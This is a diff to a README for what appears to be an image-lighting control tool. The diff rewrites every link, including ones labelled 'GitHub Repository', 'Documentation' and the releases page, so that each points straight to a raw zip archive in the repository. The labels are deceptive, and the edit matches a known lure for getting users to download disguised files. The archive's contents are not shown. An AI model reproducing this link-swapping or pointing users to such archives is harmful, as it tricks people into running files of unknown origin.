@@ -1,6 +1,6 @@
 # 🌟 Qwen-Image-Edit-3D-Lighting-Control - Control Light Sources with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
+[![Download](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To get the application, follow these steps:
 1. **Visit the Releases Page:**
    Click the link below to go to the GitHub Releases page:
 
-   [Download the latest version](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)
 
 2. **Select the Latest Release:**
    On the Releases page, locate the latest version. It is usually at the top of the list.
@@ -75,9 +75,9 @@ This application is licensed under the MIT License. You can freely use and modif
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control)
-- [Documentation](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)
 
 For more details about updates and future features, visit our Releases page frequently:
 
-[Download the latest version](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
+[Download the latest version](https://raw.githubusercontent.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/main/qwenimage/Control_Edit_Image_Lighting_Qwen_v2.0.zip)
